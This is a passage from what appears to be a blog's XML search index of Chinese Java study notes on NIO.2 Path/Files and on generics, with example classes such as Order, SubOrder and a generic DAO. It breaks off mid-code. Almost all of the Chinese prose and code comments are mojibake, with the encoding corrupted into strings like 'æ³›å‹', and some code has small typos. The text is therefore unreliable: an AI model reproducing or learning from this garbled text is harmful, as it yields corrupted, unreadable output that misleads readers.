æ—©æœŸçš„Javaåªæä¾›äº†ä¸€ä¸ªFileç±»æ¥è®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼Œä½†Fileç±»çš„åŠŸèƒ½æ¯”è¾ƒæœ‰é™ï¼Œæä¾›çš„æ–¹æ³•æ€§èƒ½ä¹Ÿä¸é«˜ã€‚è€Œä¸”ï¼Œå¤§å¤šæ•°æ–¹æ³•åœ¨å‡ºé”™æ—¶ä»…è¿”å›å¤±è´¥ï¼Œå¹¶ä¸ä¼šæä¾›å¼‚å¸¸ä¿¡æ¯ã€‚ NIO.2ä¸ºäº†å¼¥è¡¥è¿™ç§ä¸è¶³ï¼Œå¼•å…¥äº†Pathæ¥å£ï¼Œä»£è¡¨ä¸€ä¸ªå¹³å°æ— å…³çš„å¹³å°è·¯å¾„,æè¿°äº†ç›®å½•ç»“æ„ä¸­æ–‡ä»¶çš„ä½ç½®ã€‚Pathå¯ä»¥çœ‹æˆæ˜¯Fileç±»çš„å‡çº§ç‰ˆæœ¨ï¼Œå®é™…å¼•ç”¨çš„èµ„æºä¹Ÿå¯ä»¥ä¸å­˜åœ¨ã€‚ åœ¨ä»¥å‰IOæ“ä½œéƒ½æ˜¯è¿™æ ·å†™çš„: import java.io.File; File file = new File("index.html"); ä½†åœ¨Java7ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å†™: import java.nio.file.Path; import java.nio.file.Paths; Path path = Paths.get(""index.html"); åŒæ—¶ï¼ŒNIO.2åœ¨java.nio.fileåŒ…ä¸‹è¿˜æä¾›äº†Filesã€Pathså·¥å…·ç±»ï¼ŒFilesåŒ…å«äº†å¤§é‡é™æ€çš„å·¥å…·æ–¹æ³•æ¥æ“ä½œæ–‡ä»¶: Pathsåˆ™åŒ…å«äº†ä¸¤ä¸ªè¿”å›Pathçš„é™æ€å·¥å‚æ–¹æ³•ã€‚ Pathsç±»æä¾›çš„é™æ€ get()æ–¹æ³•ç”¨æ¥è·å–Pathå¯¹è±¡: static Path get(String first, string ... more): //ç”¨äºå°†å¤šä¸ªå­—ç¬¦ä¸²ä¸²è¿æˆè·¯å¾„ static Path get(URl uri): //è¿”å›æŒ‡å®šuriå¯¹åº”çš„Pathè·¯å¾„ Filesç±»ï¼š é¢˜å¤–è¯: IDEAå¯¼å…¥jaråŒ…ï¼šå¤åˆ¶åˆ°ç›®å½•ä¸‹ï¼Œå³å‡»â€“&gt; add as Library ï¼Œ ç„¶åå°±å¯ä»¥ç”¨äº†(é‡Œé¢æ”¾çš„classæ–‡ä»¶ï¼Œå¯ä»¥å¯¹å®ƒè¿›è¡Œåç¼–è¯‘) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>IOæµ</tag>
        <tag>æ–‡ä»¶</tag>
        <tag>å­¦ä¹ è®°å½•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹æ³›å‹]]></title>
    <url>%2Fposts%2F33005%2F</url>
    <content type="text"><![CDATA[ä¸ºä»€ä¹ˆè¦æœ‰æ³›å‹ æ³›å‹ï¼šæ ‡ç­¾ é›†åˆå®¹å™¨ç±»åœ¨è®¾è®¡é˜¶æ®µ/å£°æ˜é˜¶æ®µä¸èƒ½ç¡®å®šè¿™ä¸ªå®¹å™¨åˆ°åº•å®é™…å­˜çš„æ˜¯ä»€ä¹ˆç±»å‹çš„å¯¹è±¡ï¼Œæ‰€ä»¥åœ¨JDK1.5ä¹‹å‰åªèƒ½æŠŠå…ƒç´ ç±»å‹è®¾è®¡ä¸ºObjectï¼ŒJDK1.5ä¹‹åä½¿ç”¨æ³›å‹æ¥è§£å†³ã€‚å› ä¸ºè¿™ä¸ªæ—¶å€™é™¤äº†å…ƒç´ çš„ç±»å‹ä¸ç¡®å®šï¼Œå…¶ä»–çš„éƒ¨åˆ†æ˜¯ç¡®å®šçš„ï¼Œä¾‹å¦‚å…³äºè¿™ä¸ªå…ƒç´ å¦‚ä½•ä¿å­˜ï¼Œå¦‚ä½•ç®¡ç†ç­‰æ˜¯ç¡®å®šçš„ï¼Œå› æ­¤æ­¤æ—¶æŠŠå…ƒç´ çš„ç±»å‹è®¾è®¡æˆä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªç±»å‹å‚æ•°å«åšæ³›å‹ã€‚Collection&lt;E&gt;ï¼ŒList&lt;E&gt;ï¼ŒArrayList&lt;E&gt;è¿™ä¸ªå°±æ˜¯ç±»å‹å‚æ•°ï¼Œå³æ³›å‹ã€‚ * ä¸¾ä¾‹ï¼š * ä¸­è¯åº—ï¼Œæ¯ä¸ªå‡ºé¢˜å¤–é¢è´´ç€æ ‡ç­¾ * è¶…å¸‚è´­ç‰©åŠ ä¸Šå¾ˆå¤šç“¶å­ï¼Œæ¯ä¸ªç“¶å­è£…çš„æ˜¯ä»€ä¹ˆï¼Œæœ‰æ ‡ç­¾ æ³›å‹çš„æ¦‚å¿µ æ‰€è°“æ³›å‹ï¼Œå°±æ˜¯å…è®¸åœ¨å®šä¹‰ç±»ã€æ¥å£æ—¶é€šè¿‡ä¸€ä¸ªæ ‡è¯†è¡¨ç¤ºç±»ä¸­æŸä¸ªå±æ€§çš„ç±»å‹æˆ–è€…æ˜¯æŸä¸ªæ–¹æ³•çš„è¿”å›å€¼åŠå‚æ•°ç±»å‹ã€‚è¿™ä¸ªç±»å‹å‚æ•°å°†åœ¨ä½¿ç”¨æ—¶ï¼ˆä¾‹å¦‚ï¼Œç»§æ‰¿æˆ–å®ç°è¿™ä¸ªæ¥å£ï¼Œç”¨è¿™ä¸ªç±»å‹å£°æ˜å˜é‡ã€åˆ›å»ºå¯¹è±¡æ—¶ï¼‰ç¡®å®šï¼ˆå³ä¼ å…¥å®é™…çš„ç±»å‹å‚æ•°ï¼Œä¹Ÿç§°ä¸ºç±»å‹å®å‚)ã€‚ ä»JDK1.5ä»¥åï¼ŒJavaå¼•å…¥äº†â€œå‚æ•°åŒ–ç±»å‹(Parameterized type)â€çš„æ¦‚å¿µï¼Œå…è®¸æˆ‘ä»¬åœ¨åˆ›å»ºé›†åˆæ—¶å†æŒ‡å®šé›†åˆå…ƒç´ çš„ç±»å‹ï¼Œæ­£å¦‚: List&lt;String&gt;ï¼Œè¿™è¡¨æ˜è¯¥Liståªèƒ½ä¿å­˜å­—ç¬¦ä¸²ç±»å‹çš„å¯¹è±¡ JDK1.5æ”¹å†™äº†é›†åˆæ¡†æ¶ä¸­çš„å…¨éƒ¨æ¥å£å’Œç±»ï¼Œä¸ºè¿™äº›æ¥å£ã€ç±»å¢åŠ äº†æ³›å‹æ”¯æŒï¼Œä»è€Œå¯ä»¥åœ¨å£°æ˜é›†åˆå˜é‡ã€åˆ›å»ºé›†åˆå¯¹è±¡æ—¶ä¼ å…¥ç±»å‹å®å‚ã€‚ ä½¿ç”¨ä¸ä¸ä½¿ç”¨æ³›å‹çš„åŒºåˆ«ï¼š åœ¨é›†åˆä¸­ä½¿ç”¨æ³›å‹ /** æ³›å‹çš„ä½¿ç”¨ï¼š *1.ä»JDK1.5ä»¥åæ–°å¢çš„ç‰¹æ€§ * *2.åœ¨é›†åˆä¸­ä½¿ç”¨æ³›å‹ï¼š * (1).é›†åˆæ¥å£æˆ–é›†åˆç±»åœ¨jdk5.0æ—¶éƒ½ä¿®æ”¹ä¸ºå¸¦æ³›å‹çš„ç»“æ„ * (2).åœ¨å®ä¾‹åŒ–é›†åˆç±»æ—¶ï¼Œå¯ä»¥æŒ‡æ˜å…·ä½“çš„æ³›å‹ç±»å‹ * (3).æŒ‡æ˜å®Œä»¥åï¼Œåœ¨é›†åˆç±»æˆ–æ¥å£ä¸­å‡¡æ˜¯å®šä¹‰ç±»æˆ–æ¥å£æ—¶ï¼Œå†…éƒ¨ç»“æ„(æ¯”å¦‚æ–¹æ³•ã€æ„é€ å™¨ã€å±æ€§ç­‰)ä½¿ç”¨åˆ°ç±»çš„æ³›å‹çš„ä½ç½®ï¼Œéƒ½æŒ‡å®šä¸ºå®ä¾‹åŒ–çš„æ³›å‹ç±»å‹ * æ¯”å¦‚ï¼šadd(E e) --> å®ä¾‹åŒ–æ—¶å€™: add(Integer e) * (4).æ³›å‹çš„ç±»å‹å¿…é¡»æ˜¯ç±»ï¼Œä¸èƒ½æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ã€‚éœ€è¦ç”¨åˆ°åŸºæœ¬æ•°æ®ç±»å‹çš„ä½ç½®ï¼Œæ‹¿åŒ…è£…ç±»æ›¿æ¢ * (5).å¦‚æœå®ä¾‹åŒ–æ—¶ï¼Œæ²¡æœ‰æŒ‡å®šæ³›å‹çš„ç±»å‹ï¼Œé»˜è®¤ç±»å‹ä¸ºjava.lang.Objectç±»å‹ * **/ /* * åœ¨é›†åˆä¸­ä¸ä½¿ç”¨æ³›å‹çš„æƒ…å†µ * */ @Test public void test(){ ArrayList list = new ArrayList(); // å­˜æ”¾å­¦ç”Ÿæˆç»© list.add(78); list.add(99); list.add(88); list.add(65); //é—®é¢˜1ï¼šç±»å‹ä¸å®‰å…¨ list.add("Tom"); for(Object score: list){ //é—®é¢˜2ï¼šå¼ºè½¬æ—¶ï¼Œå¯èƒ½å‡ºç°ClassCastException int stuScore = (Integer) score; System.out.println(stuScore); } } /* * åœ¨é›†åˆä¸­ä½¿ç”¨æ³›å‹çš„æƒ…å†µ: ä»¥ArrayListä¸ºä¾‹ * */ @Test public void test1(){ ArrayList&lt;Integer> list = new ArrayList&lt;Integer>(); // ç”¨Integerè€Œä¸æ˜¯intï¼Œæ³›å‹æ˜¯ç±»å‹ï¼Œä¸èƒ½ç”¨åŸºæœ¬ç±»å‹æ‰€ä»¥ç”¨åŒ…è£…ç±» //è¿™æ ·ä¼ å…¥çš„å¯¹è±¡åªèƒ½æ˜¯Integerç±»å‹çš„äº† list.add(78); list.add(99); list.add(88); list.add(65); // ç¼–è¯‘æ—¶ï¼Œå°±ä¼šè¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œä¿è¯æ•°æ®çš„å®‰å…¨ // list.add("Tom"); //æ–¹å¼1ï¼š for(Integer score: list){ // é¿å…äº†å¼ºè½¬æ“ä½œ int stuScore = score; System.out.println(stuScore); } //æ–¹å¼2ï¼š Iterator&lt;Integer> iterator = list.iterator(); while (iterator.hasNext()){ int nu = iterator.next(); System.out.println(nu); } } /* * åœ¨é›†åˆä¸­ä½¿ç”¨æ³›å‹çš„æƒ…å†µ: ä»¥HashMapä¸ºä¾‹ * */ @Test public void test2(){ Map&lt;String, Integer> map = new HashMap&lt;String, Integer>(); // key-valueä¸¤ä¸ªç±»å‹éƒ½è¦æŒ‡å®š map.put("TOm", 18); map.put("Tom", 20); map.put("Jerry", 18); //å– //æ³›å‹çš„åµŒå¥— // Entryæ˜¯Mapé‡Œé¢çš„ï¼Œæ²¡æœ‰æš´éœ²åœ¨å¤–é¢ Set&lt;Map.Entry&lt;String, Integer>> entries = map.entrySet(); Iterator&lt;Map.Entry&lt;String, Integer>> iterator = entries.iterator(); while (iterator.hasNext()){ Map.Entry&lt;String, Integer> entry = iterator.next(); String key = entry.getKey(); Integer val = entry.getValue(); } // jdk7æ–°ç‰¹æ€§ï¼šç±»å‹æ¨æ–­ Map&lt;String, Integer> map2 = new HashMap&lt;>(); //åé¢å¯çœç•¥ } è‡ªå®šä¹‰æ³›å‹è‡ªå®šä¹‰çš„æ³›å‹ç±»ï¼š package cn.xpshuai.java1; import java.util.ArrayList; import java.util.List; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-28 14:28 * @åŠŸèƒ½ï¼šè‡ªå®šä¹‰æ³›å‹ç»“æ„ï¼šæ³›å‹ç±»ã€æ³›å‹æ¥å£ã€æ³›å‹æ–¹æ³• * * T, E * k,v ä¸€èˆ¬ä¸ºé”®å€¼ */ public class Order&lt;T> { String orderName; int orderId; //ç±»çš„å†…éƒ¨ç»“æ„å°±å¯ä»¥ä½¿ç”¨ç±»çš„æ³›å‹ T orderT; public Order(){ // T[] arr = new T[10]; //ç¼–è¯‘ä¸é€šè¿‡ï¼Œ ä¸èƒ½new // T[] arr = (T[]) new Object[10]; //è¿™æ ·å¯ä»¥ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸è¿™ä¹ˆç”¨ } public Order(String orderName, int orderId, T orderT) { this.orderName = orderName; this.orderId = orderId; this.orderT = orderT; } //å¦‚ä¸‹ä¸Šæ–¹æ³•éƒ½ä¸æ˜¯æ³›å‹æ–¹æ³• public T getOrderT(){ return orderT; } public void setOrderT(T orderT){ this.orderT = orderT; } @Override public String toString() { return "Order{" + "orderName='" + orderName + '\'' + ", orderId='" + orderId + '\'' + ", orderT=" + orderT + '}'; } //é™æ€æ–¹æ³•ä¸­ä¸èƒ½ä½¿ç”¨ç±»çš„æ³›å‹ // public static void show(T orderT){ // System.out.println("show"); // } // public static void show2(){ // ç¼–è¯‘ä¸é€šè¿‡ // try{ // // }catch (T t){ // // } // } //æ³›å‹æ–¹æ³•ï¼šåœ¨æ–¹æ³•ä¸­å‡ºç°äº†æ³›å‹çš„ç»“æ„ï¼Œæ³›å‹å‚æ•°ä¸ç±»çš„æ³›å‹å‚æ•°æ²¡æœ‰ä»»ä½•å…³ç³» //æ¢å¥è¯è¯´ï¼šæ³›å‹æ–¹è¾¾æ‰€å±çš„ç±»æ˜¯ä¸æ˜¯æ³›å‹ç±»éƒ½æ²¡æœ‰å…³ç³»ã€‚ public &lt;E> List&lt;E> copyFromArrayToList(E[] arr){ // Eç±»å‹çš„æ•°ç»„, å‰é¢ä¹Ÿè¦åŠ &lt;E> ArrayList&lt;E> list = new ArrayList&lt;>(); for(E e: arr){ list.add(e); } return list; } } ä½¿ç”¨: @Test public void test3(){ // ä½¿ç”¨è‡ªå®šä¹‰çš„æ³›å‹ç±» Order.java // å¦‚æœå®šä¹‰äº†æ³›å‹ç±»ï¼Œå®ä¾‹åŒ–æ²¡æœ‰æŒ‡æ˜ç±»çš„æ³›å‹ï¼Œåˆ™è®¤ä¸ºæ­¤æ³›å‹ç±»å‹ä¸ºObjectç±»å‹ // è¦æ±‚ï¼šå¦‚æœå®šä¹‰äº†ç±»æ˜¯å¸¦æ³›å‹çš„ï¼Œå»ºè®®åœ¨å®ä¾‹åŒ–æ—¶è¦æŒ‡æ˜ç±»çš„æ³›å‹ã€‚ // Order order = new Order(); // order.setOrderT(12); // order.setOrderT("AA"); Order&lt;String> order = new Order&lt;String>("orderAA", 1001, "æˆ‘æ˜¯æ³›å‹å°å®ä¾‹1"); order.setOrderT("æˆ‘æ˜¯æ³›å‹å°å®ä¾‹:2"); System.out.println(order.getOrderT()); //ã€æ³›å‹åœ¨ç»§æ‰¿ä¸Šçš„ä½“ç°ã€‘ //å¦‚æœå­ç±»æŒ‡æ˜äº†å…·ä½“çš„æ³›å‹ç±»å‹ï¼Œä½¿ç”¨å­ç±»å®ä¾‹åŒ–çš„æ—¶å€™å°±ä¸ç”¨å†™æ³›å‹çš„å½¢å¼äº† SubOrder sub = new SubOrder(); //ç”±äºå­ç±»åœ¨ç»§æ‰¿å¸¦æ³›å‹çš„çˆ¶ç±»æ—¶ï¼ŒæŒ‡æ˜äº†æ³›å‹ç±»å‹ã€‚åˆ™å®ä¾‹åŒ–å­ç±»å¯¹è±¡æ—¶ï¼Œä¸å†éœ€è¦æŒ‡æ˜æ³›å‹ã€‚ sub.setOrderT(111); // å­ç±»ä¸å…·ä½“çˆ¶ç±»ä¸­æŒ‡æ˜æ³›å‹çš„ç±»å‹ï¼ŒSubOrder1&lt;T>ä»ç„¶æ˜¯æ³›å‹ç±»ï¼Œä½¿ç”¨å­ç±»å®ä¾‹åŒ–çš„æ—¶å€™ä»ç„¶å†™æ³›å‹çš„å½¢å¼äº† SubOrder1&lt;String> sub1 = new SubOrder1&lt;>(); sub1.setOrderT("CCC"); } æ³›å‹ç±»çš„å­ç±»ï¼š package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-28 14:40 * @åŠŸèƒ½ï¼šOrderçš„å­ç±» */ //è¿™é‡Œå¦‚æœæŒ‡æ˜äº†å…·ä½“çš„æ³›å‹ç±»å‹ï¼Œä½¿ç”¨å­ç±»å®ä¾‹åŒ–çš„æ—¶å€™å°±ä¸ç”¨å†™æ³›å‹çš„å½¢å¼äº† public class SubOrder extends Order&lt;Integer>{ //...... } æ³›å‹ç±»çš„å­ç±»2: package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-28 14:46 * @åŠŸèƒ½ï¼šè¿™é‡Œçš„å­ç±»ä¸å…·ä½“çˆ¶ç±»ä¸­æŒ‡æ˜æ³›å‹çš„ç±»å‹ï¼ŒSubOrder1&lt;T>ä»ç„¶æ˜¯æ³›å‹ç±»ï¼Œä½¿ç”¨å­ç±»å®ä¾‹åŒ–çš„æ—¶å€™ä»ç„¶å†™æ³›å‹çš„å½¢å¼äº† */ public class SubOrder1&lt;T> extends Order&lt;T> { } è‡ªå®šä¹‰æ³›å‹ç±»ä¸æ³›å‹æ¥å£çš„æ³¨æ„ç‚¹ï¼š æ³›å‹ç±»å¯èƒ½æœ‰å¤šä¸ªå‚æ•°ï¼Œæ­¤æ—¶åº”å°†å¤šä¸ªå‚æ•°ä¸€èµ·æ”¾åœ¨å°–æ‹¬å·å†…ã€‚æ¯”å¦‚:&lt;E1,E2,E3&gt; æ³›å‹ç±»å£°æ˜çš„æ„é€ å™¨å¦‚ä¸‹:public GenericClass()ã€‚è€Œä¸‹é¢æ˜¯é”™è¯¯çš„:public GenericClass&lt;E&gt;() å®ä¾‹åŒ–åï¼Œæ“ä½œåŸæ¥æ³›å‹ä½ç½®çš„ç»“æ„å¿…é¡»ä¸æŒ‡å®šçš„æ³›å‹ç±»å‹ä¸€è‡´ã€‚ æ³›å‹ä¸åŒçš„å¼•ç”¨ä¸èƒ½ç›¸äº’èµ‹å€¼ï¼ˆå°½ç®¡åœ¨ç¼–è¯‘æ—¶ArrayList&lt;String&gt;å’ŒArrayList&lt;Integer&gt;æ˜¯ä¸¤ç§ç±»å‹ï¼Œä½†æ˜¯ï¼Œåœ¨è¿è¡Œæ—¶åªæœ‰ä¸€ä¸ªArrayListè¢«åŠ è½½åˆ°JVMä¸­ï¼‰ã€‚ æ³›å‹å¦‚æœä¸æŒ‡å®šï¼Œå°†è¢«æ“¦é™¤ï¼Œæ³›å‹å¯¹åº”çš„ç±»å‹å‡æŒ‰ç…§Objectå¤„ç†ï¼Œä½†ä¸ç­‰ä»·äºObjectã€‚ç»éªŒ: æ³›å‹è¦ä½¿ç”¨ä¸€è·¯éƒ½ç”¨ã€‚è¦ä¸ç”¨ï¼Œä¸€è·¯éƒ½ä¸è¦ç”¨ã€‚ å¦‚æœæ³›å‹ç»“æ„æ˜¯ä¸€ä¸ªæ¥å£æˆ–æŠ½è±¡ç±»ï¼Œåˆ™ä¸å¯åˆ›å»ºæ³›å‹ç±»çš„å¯¹è±¡ã€‚ jdk1.7ï¼Œæ³›å‹çš„ç®€åŒ–æ“ä½œ:ArrayList&lt;Fruit&gt; flist = new ArrayList&lt;&gt;(); æ³›å‹çš„æŒ‡å®šä¸­ä¸èƒ½ä½¿ç”¨åŸºæœ¬æ•°æ®ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨åŒ…è£…ç±»æ›¿æ¢ã€‚ åœ¨ç±»/æ¥å£ä¸Šå£°æ˜çš„æ³›å‹ï¼Œåœ¨æœ¬ç±»æˆ–æœ¬æ¥å£ä¸­å³ä»£è¡¨æŸç§ç±»å‹ï¼Œå¯ä»¥ä½œä¸ºéé™æ€å±æ€§çš„ç±»å‹ã€éé™æ€æ–¹æ³•çš„å‚æ•°ç±»å‹ã€éé™æ€æ–¹æ³•çš„è¿”å›å€¼ç±»å‹ã€‚ä½†åœ¨é™æ€æ–¹æ³•ä¸­ä¸èƒ½ä½¿ç”¨ç±»çš„æ³›å‹ã€‚ å¼‚å¸¸ç±»æ˜¯ä¸èƒ½å£°æ˜ä¸ºæ³›å‹çš„(public calss MyExpection&lt;T&gt; extends Exceptionæ˜¯é”™è¯¯çš„) ä¸èƒ½ä½¿ç”¨new E[]ã€‚ä½†æ˜¯å¯ä»¥:E]elements =(E[])new Object[capacity];å‚è€ƒ: ArrayListæºç ä¸­å£°æ˜:Object[]elementDataï¼Œè€Œéæ³›å‹å‚æ•°ç±»å‹æ•°ç»„ã€‚ çˆ¶ç±»æœ‰æ³›å‹ï¼Œå­ç±»å¯ä»¥é€‰æ‹©ä¿ç•™æ³›å‹ä¹Ÿå¯ä»¥é€‰æ‹©æŒ‡å®šæ³›å‹ç±»å‹: å­ç±»ä¸ä¿ç•™çˆ¶ç±»çš„æ³›å‹: æŒ‰éœ€å®ç° æ²¡æœ‰ç±»å‹ï¼šæ“¦é™¤ å…·ä½“ç±»å‹ å­ç±»ä¿ç•™çˆ¶ç±»çš„æ³›å‹:æ³›å‹å­ç±» å…¨éƒ¨ä¿ç•™ éƒ¨åˆ†ä¿ç•™ ç»“è®º:å­ç±»å¿…é¡»æ˜¯â€œå¯ŒäºŒä»£â€ï¼Œå­ç±»é™¤äº†æŒ‡å®šæˆ–ä¿ç•™çˆ¶ç±»çš„æ³›å‹ï¼Œè¿˜å¯ä»¥å¢åŠ è‡ªå·±çš„æ³›å‹ @Test public void test4(){ // æ³›å‹ä¸åŒçš„å¼•ç”¨ä¸èƒ½ç›¸äº’èµ‹å€¼ ArrayList&lt;String> l1 = null; ArrayList&lt;Integer> l2 = null; // l2 = l1; //ä¸èƒ½ç›¸äº’èµ‹å€¼ } æ³›å‹æ–¹æ³•(é‡éš¾ç‚¹)ï¼š package cn.xpshuai.java1; import java.util.ArrayList; import java.util.List; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-28 14:28 * @åŠŸèƒ½ï¼šè‡ªå®šä¹‰æ³›å‹ç»“æ„ï¼šæ³›å‹ç±»ã€æ³›å‹æ¥å£ã€æ³›å‹æ–¹æ³• * * T, E * k,v ä¸€èˆ¬ä¸ºé”®å€¼ */ public class Order&lt;T> { String orderName; int orderId; //ç±»çš„å†…éƒ¨ç»“æ„å°±å¯ä»¥ä½¿ç”¨ç±»çš„æ³›å‹ T orderT; public Order(){ // T[] arr = new T[10]; //ç¼–è¯‘ä¸é€šè¿‡ï¼Œ ä¸èƒ½new // T[] arr = (T[]) new Object[10]; //è¿™æ ·å¯ä»¥ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸è¿™ä¹ˆç”¨ } public Order(String orderName, int orderId, T orderT) { this.orderName = orderName; this.orderId = orderId; this.orderT = orderT; } //å¦‚ä¸‹ä¸Šæ–¹æ³•éƒ½ä¸æ˜¯æ³›å‹æ–¹æ³• public T getOrderT(){ return orderT; } public void setOrderT(T orderT){ this.orderT = orderT; } @Override public String toString() { return "Order{" + "orderName='" + orderName + '\'' + ", orderId='" + orderId + '\'' + ", orderT=" + orderT + '}'; } //é™æ€æ–¹æ³•ä¸­ä¸èƒ½ä½¿ç”¨ç±»çš„æ³›å‹(å½“æ—¶è¿˜æ²¡æœ‰è¿™ä¸ªå¯¹è±¡) // public static void show(T orderT){ // System.out.println("show"); // } // public static void show2(){ // ç¼–è¯‘ä¸é€šè¿‡ // try{ // // }catch (T t){ // // } // } //æ³›å‹æ–¹æ³•ï¼šåœ¨æ–¹æ³•ä¸­å‡ºç°äº†æ³›å‹çš„ç»“æ„ï¼Œæ³›å‹å‚æ•°ä¸ç±»çš„æ³›å‹å‚æ•°æ²¡æœ‰ä»»ä½•å…³ç³» //æ¢å¥è¯è¯´ï¼šæ³›å‹æ–¹è¾¾æ‰€å±çš„ç±»æ˜¯ä¸æ˜¯æ³›å‹ç±»éƒ½æ²¡æœ‰å…³ç³»ã€‚ //æ³›å‹æ–¹æ³•å¯ä»¥å£°æ˜ä¸ºé™æ€çš„ã€‚åŸå› æ³›å‹å‚æ•°æ˜¯åœ¨è°ƒç”¨æ–¹æ³•æ—¶ç¡®å®šçš„ï¼Œå¹¶éåœ¨å®ä¾‹åŒ–æ—¶ç¡®å®šçš„ public &lt;E> List&lt;E> copyFromArrayToList(E[] arr){ // Eç±»å‹çš„æ•°ç»„, å‰é¢ä¹Ÿè¦åŠ &lt;E>ï¼Œä¸ç„¶ç¼–è¯‘å™¨ä¼šè®¤ä¸ºEæ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„ä¸€ä¸ªç±»å‘¢ // public static &lt;E> List&lt;E> copyFromArrayToList(E[] arr){ // è¿™é‡Œå¯ä»¥åŠ staticçš„å“¦ ArrayList&lt;E> list = new ArrayList&lt;>(); for(E e: arr){ list.add(e); } return list; } } //æµ‹è¯•æ³›å‹æ–¹æ³• @Test public void test5(){ Order&lt;String> order = new Order&lt;String>("orderAA", 1001, "æˆ‘æ˜¯æ³›å‹å°å®ä¾‹1"); Integer[] arr = new Integer[]{1,2,3,4}; // æ³›å‹æ–¹æ³•åœ¨è°ƒç”¨æ—¶ï¼ŒæŒ‡æ˜æ³›å‹å‚æ•°çš„ç±»å‹ï¼ˆä¸æ³›å‹ç±»çš„ç±»å‹æ˜¯æ²¡æœ‰å…³ç³»çš„ï¼‰ List&lt;Integer> list = order.copyFromArrayToList(arr); System.out.println(list); } æ³›å‹ç±»å’Œæ³›å‹æ–¹æ³•æƒ…æ™¯ä¸¾ä¾‹ï¼š DAO(æ“ä½œè¡¨çš„å…±æ€§æ“ä½œ) package cn.xpshuai.java1; import java.util.List; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-28 15:24 * @åŠŸèƒ½ï¼šæ¨¡æ‹Ÿ * DAO: data(base) access object * å®šä¹‰äº†ä¸€äº›é€šç”¨çš„æ•°æ®åº“çš„æ“ä½œæ–¹æ³• * * æ•°æ®åº“ä¸­ä¸€ä¸ªè¡¨å¯¹åº”javaçš„ä¸€ä¸ªç±» * */ public class DAO &lt;T>{ // //åˆ é™¤ä¸€æ¡è®°å½• public void add(T t){ } //åˆ é™¤ä¸€æ¡è®°å½• public boolean remove(int index){ return false; } //ä¿®æ”¹ä¸€æ¡è®°å½• public void update(int index, T t){ } //æŸ¥è¯¢ä¸€æ¡è®°å½• public T getIndex(int index){ return null; } //æŸ¥è¯¢å¤šæ¡è®°å½• public List&lt;T> getList(int index){ return null; } //æ³›å‹æ–¹æ³• // ä¸¾ä¾‹:è·å–è¡¨ä¸­ä¸€å…±æœ‰å¤šå°‘æ¡è®°å½•?è·å–æœ€å¤§çš„å‘˜å·¥å…¥èŒæ—¶é—´? public &lt;E> E getValue(){ return null; } } å­ç±»(åªèƒ½å…·ä½“æ“ä½œæŸä¸ªè¡¨çš„ç±»): package cn.xpshuai.java1; //è¿™ä¸ªç»§æ‰¿DAOï¼Œå†™å…·ä½“çš„å¯¹Customerçš„æ•°æ®åº“çš„æ“ä½œ public class CustomerDAO extends DAO&lt;Customer>{ //ä¸“é—¨æ“ä½œCustomerè¡¨ } å­ç±»(æŸä¸ªæ•°æ®è¡¨å¯¹åº”ä¸€ä¸ªç±»): package cn.xpshuai.java1; public class Customer { //æ­¤ç±»å¯¹åº”æ•°æ®åº“ä¸­çš„ä¸€ä¸ªè¡¨ } æ“ä½œï¼š //æµ‹è¯•ä¾‹å­(DAO) @Test public void testDao(){ CustomerDAO dao1 = new CustomerDAO(); dao1.add(new Customer());// List&lt;Customer> list = dao1.getList(1); } æ³›å‹åœ¨ç»§æ‰¿ä¸Šçš„ä½“ç°ç±»Aæ˜¯ç±»Bçš„çˆ¶ç±»ï¼ŒG&lt;A&gt;å’ŒG&lt;B&gt;ä¸å…·å¤‡å­çˆ¶ç±»å…³ç³»ï¼ŒäºŒè€…æ˜¯å¹¶åˆ—å…³ç³» è¡¥å……ï¼šç±»Aæ˜¯ç±»Bçš„çˆ¶ç±»/æ¥å£ï¼ŒA&lt;G&gt;ä¸&lt;G&gt;ä¹Ÿå…·å¤‡å­çˆ¶ç±»/æ¥å£å…³ç³» package cn.xpshuai.java2; import org.junit.Test; import java.util.ArrayList; import java.util.List; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-28 15:38 * @åŠŸèƒ½ï¼š * * 1.æ³›å‹åœ¨ç»§æ‰¿æ–¹é¢çš„ä½“ç° * * * 2.é€šé…ç¬¦çš„ä½¿ç”¨ * * * * */ public class GenericTest { /* 1.æ³›å‹åœ¨ç»§æ‰¿æ–¹é¢çš„ä½“ç° ç±»Aæ˜¯ç±»Bçš„çˆ¶ç±»ï¼ŒG&lt;A>å’ŒG&lt;B>ä¸å…·å¤‡å­çˆ¶ç±»å…³ç³»ï¼ŒäºŒè€…æ˜¯å¹¶åˆ—å…³ç³» è¡¥å……ï¼šç±»Aæ˜¯ç±»Bçš„çˆ¶ç±»/æ¥å£ï¼ŒA&lt;G>ä¸&lt;G>ä¹Ÿå…·å¤‡å­çˆ¶ç±»/æ¥å£å…³ç³» */ @Test public void test(){ //åœ¨ç±»ä¸Šçš„å±•ç¤º, ç±»ä¼¼å¤šæ€çš„å±•ç¤º Object obj = null; String str = null; obj = str; //åœ¨æ•°ç»„ä¸Šçš„å±•ç¤º Object[] arr1 = null; String[] arr2 = null; arr1 = arr2; // ç¼–è¯‘ä¸é€šè¿‡ List&lt;Object> l1 = null; List&lt;String> l2 = null; 